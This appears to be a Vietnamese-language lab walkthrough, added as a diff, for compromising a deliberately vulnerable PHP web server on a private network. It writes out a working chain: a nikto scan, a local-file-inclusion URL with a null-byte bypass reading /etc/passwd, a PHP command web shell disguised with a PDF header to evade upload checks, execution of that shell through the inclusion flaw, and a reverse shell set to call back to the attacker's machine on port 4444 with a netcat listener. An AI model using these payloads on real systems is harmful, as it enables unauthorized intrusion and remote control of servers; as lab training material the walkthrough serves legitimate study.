@@ -1,0 +1,53 @@
+Máy chủ khai thác lỗ hổng tên: PHP include and post exploitation.
+
+Sử dụng công cụ nikto để dò quét lỗ hổng website
+
+nikto -h 192.168.27.165
+
+Kết quả tìm được lỗ hổng LFI tại đường dẫn sau:
+
+http://192.168.27.165/index.php?page=../../../../../../../../../../etc/passwd%00
+
+Đối với PHP version <= 5.3.*, chúng ta sử dụng ký tự null (%00) để bypass. 
+Cause: the PHP engine to ignore everything after the null byte.
+
+Tiếp theo, chúng ta sẽ upload 1 file shell lên hệ thống mục tiêu bằng cách bypass với
+định dạng file là PDF
+#################################################
+
+%PDF-1.4
+
+<?php
+	system($_GET['cmd']);
+?>
+#################################################
+Vào page submit để upload file shell vừa tạo
+
+Sử dụng công cụ dirb để tìm kiếm thông tin đường dẫn chứa file upload
+
+dirb http://192.168.27.165
+|
+uploads
+
+Kiểm tra thư mục chứa có tên uploads đã có file shell.
+
+Kết hợp với lỗ hổng LFI, chúng ta sẽ thực thi file shell này để chiếm quyền hệ thống.
+
+http://192.168.27.165/index.php?page=uploads/shell.pdf%00&cmd=whoami
+
+Tìm google với từ khoá "php reverse shell"
+
+Tải file php-reverse-shell.php về và sửa đổi thông tin kết nối:
+
+# Thêm pdf header trick
+%PDF-1.4
+# Sửa IP kết nối đến máy Kali linux:
+$ip = '192.168.27.160';
+$port = 4444;
+
+Sửa đuôi file từ php sang pdf và upload lên website.
+
+Mở netcat lắng nghe kết nối đến:
+nc -nvlp 4444
+
+Truy cập đến file shell2.pdf để thực thi kết nối về máy Kali Linux.
